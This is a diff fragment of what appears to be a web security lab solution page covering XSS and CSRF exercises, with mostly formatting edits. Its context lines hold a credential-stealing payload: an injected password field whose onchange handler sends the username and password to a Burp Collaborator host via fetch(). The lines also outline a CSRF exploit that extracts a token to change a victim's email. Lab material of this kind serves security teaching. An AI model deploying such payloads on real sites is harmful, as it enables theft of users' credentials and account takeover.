@@ -1392,6 +1392,7 @@ body:username.value+':'+this.value
                 </ol>
             </div>
         </div>
+
 ```html
 <input name=username id=username>
 <input type=password name=password onchange="if(this.value.length)fetch('https://mwmtx7rsry5n5s8aqittdm7v4maey3.burpcollaborator.net',{
@@ -1446,7 +1447,7 @@ req.send();
                                 There's an anti-CSRF token in a hidden input called <code>token</code>.
                             </li>
                         </ul>
-                        This means your exploit will need to load the user account page, extract the <a href="/web-security/csrf/tokens">CSRF token</a>, and then use the token to change the victim's email address.
+                        This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
                     </li>
                     <li>
                         <p>
@@ -1471,8 +1472,6 @@ function handleResponse() {
                 </ol>
             </div>
         </div>
-
-Official payload
 
 ```javascript
 <script>
